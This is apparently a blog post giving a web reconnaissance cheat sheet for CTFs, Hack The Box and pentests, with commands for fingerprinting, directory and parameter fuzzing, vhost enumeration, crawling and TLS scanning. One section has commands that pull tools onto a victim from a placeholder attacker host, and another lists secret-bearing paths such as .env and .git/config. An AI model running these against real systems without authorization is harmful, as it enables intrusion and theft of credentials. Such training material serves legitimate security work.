---
layout: post
title: "Web Attack Surface & Enumeration Cheatsheet"
subtitle: "Discovery, fingerprinting, content discovery, parameter fuzzing, virtual hosts and technology mapping for HTB, CTFs and real-world pentests"
tags: [web, enumeration, recon, fuzzing, hacking, htb, ctf]
---

A practical cheat sheet for fast web attack surface discovery and enumeration during HTB, CTFs, bug bounty and offensive security engagements.

---

# 0. ESSENTIAL ENUMERATION TOOLS & RESOURCES

## Core Tools
- **WhatWeb**: Fingerprinting  
- **Wappalyzer**: Tech detection  
- **nmap NSE HTTP scripts**  
- **gobuster / ffuf / feroxbuster**: Directory brute-force  
- **wfuzz / ffuf**: Parameter fuzzing  
- **hakrawler / katana**: Crawling  
- **gau / waybackurls**: Archived URLs  
- **httprobe / httpx**: Alive checking  
- **Nikto**: Quick vulnerability scan  

## Useful Wordlists
- **SecLists**: https://github.com/danielmiessler/SecLists  
- **Assetnote Wordlists**: https://wordlists.assetnote.io/  
- **FuzzDB**: https://github.com/fuzzdb-project/fuzzdb  

---

# 0.1 QUICK FILE TRANSFER COMMANDS (upload tools to target)

## Attacker: Host files
```

python3 -m http.server 8000

```

## Victim: Download tools
```

wget http://ATTACKER_IP:8000/tool
curl -O http://ATTACKER_IP:8000/tool

```

---

# 1. BASIC RECON & FINGERPRINTING

## Identify tech, server & framework
```

whatweb [http://TARGET](http://TARGET)

```

## HTTP headers
```

curl -I [http://TARGET](http://TARGET)

```

## Full response
```

curl -v [http://TARGET](http://TARGET)

```

## Nmap HTTP enumeration
```

nmap -sV --script=http-enum,http-headers,http-methods -p80,443 TARGET

```

## CMS detection
```

whatweb --log-verbose=out.txt [http://TARGET](http://TARGET)

```

---

# 2. DIRECTORIES & FILE DISCOVERY

## Gobuster (directory brute-force)
```

gobuster dir -u [http://TARGET](http://TARGET) -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50

```

## Feroxbuster (recursive)
```

feroxbuster -u [http://TARGET](http://TARGET) -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50

```

## FFUF (fast and powerful)
```

ffuf -u [http://TARGET/FUZZ](http://TARGET/FUZZ) -w /usr/share/seclists/Discovery/Web-Content/common.txt

```

## File extensions
```

ffuf -u [http://TARGET/FUZZ](http://TARGET/FUZZ) -w extlist.txt -e .php,.asp,.aspx,.js,.html,.bak

```

---

# 3. PARAMETER DISCOVERY (GET/POST)

## FFUF – Parameter fuzzing
```

ffuf -u "[http://TARGET/page.php?FUZZ=test](http://TARGET/page.php?FUZZ=test)" -w /usr/share/seclists/Discovery/Web-Content/burpsuite-params.txt

```

## WFuzz
```

wfuzz -u "[http://TARGET/page.php?FUZZ=value](http://TARGET/page.php?FUZZ=value)" -w /usr/share/seclists/Discovery/Web-Content/burp-params.txt --hh 0

```

## Fuzz POST parameters
```

ffuf -X POST -d "FUZZ=value" -u [http://TARGET/api](http://TARGET/api) -w params.txt

```

---

# 4. VIRTUAL HOST ENUMERATION (VHOSTS)

## Fuzz the Host header
```

ffuf -w subdomains.txt -u [http://TARGET](http://TARGET) -H "Host: FUZZ.target.com"

```

## Identify hidden admin panels across vhosts
Look for:
- `admin`  
- `internal`  
- `staging`  
- `api`  
- `dev`  

---

# 5. CRAWLING & CONTENT DISCOVERY

## Katana (project discovery)
```

katana -u [http://TARGET](http://TARGET) -o urls.txt

```

## Hakrawler
```

hakrawler -url [http://TARGET](http://TARGET) -depth 3 -plain > endpoints.txt

```

## Gau (extract archived URLs)
```

gau TARGET --o urls.txt

```

## Combine with HTTPX to filter live URLs
```

cat urls.txt | httpx -silent > alive.txt

```

---

# 6. CHECKING HTTP METHODS & MISCONFIGURATIONS

## Check supported HTTP methods
```

curl -X OPTIONS [http://TARGET](http://TARGET) -v

```

Look for:
- `PUT`
- `DELETE`
- `TRACE`
- `HEAD`
- `PROPFIND`

## Test WebDAV (if PUT is enabled)
```

davtest -url [http://TARGET](http://TARGET)

```

---

# 7. COMMON SENSITIVE FILES TO CHECK

Try accessing:
```

/robots.txt
/sitemap.xml
/phpinfo.php
/server-status
/admin
/backup
/.git/
/.git/config
/.env
/config.php
/.DS_Store

```

Look for:
- Backups: `.zip`, `.tar`, `.bak`, `.old`
- Debug endpoints
- API docs: `/swagger`, `/api-docs`, `/openapi.json`

---

# 8. JAVASCRIPT ENUMERATION

## Extract JavaScript files automatically
```

grep -oP '(?<=src=")[^"]*' index.html

```

## Manually inspect:
- API endpoints  
- Hardcoded tokens  
- Hidden routes  
- Developer comments  
- Feature flags  

---

# 9. TECHNOLOGY & PLATFORM-SPECIFIC ENUMERATION

### PHP
- `phpinfo.php`
- Hidden include files  
- `.bak` and `.swp` files

### Node.js
- `package.json` leaks  
- Unauthenticated endpoints  
- Prototype pollution risks

### Python Django/Flask
- `/admin`  
- Static file leaks  
- Debug mode

### ASP.NET / IIS
- `.config` files  
- Verb tampering  
- `/trace.axd`

### Java / Spring
- `/actuator` endpoints  
- `.jsp` backups  
- Deserialization entrypoints

---

# 10. TLS/SSL ENUMERATION

## SSLScan
```

sslscan TARGET

```

## Test weak ciphers
```

nmap --script ssl-enum-ciphers -p 443 TARGET

```

---

# 11. AUTOMATING ENUMERATION PIPELINES

## Basic pipeline example
```

httpx -l hosts.txt -silent | tee live.txt
feroxbuster -u [http://TARGET](http://TARGET) -t 50 -w common.txt -q -o dirs.txt
katana -u [http://TARGET](http://TARGET) -o urls.txt
gau TARGET | tee archived.txt

```

## Combine output for exploitation
```

cat urls.txt archived.txt dirs.txt | sort -u > all-endpoints.txt

```

---

# Final Notes

This cheat sheet covers the essential phases of web attack surface mapping:

* Fingerprinting (headers, server, tech)  
* Directory & file discovery  
* Parameter fuzzing  
* VHost enumeration  
* Crawling & archived URL extraction  
* Identifying sensitive files and misconfigurations  
* Enumerating platform-specific features  
* Automating full recon pipelines  

Use it for HTB, CTFs, bug bounty recon, and real-world web pentesting.

---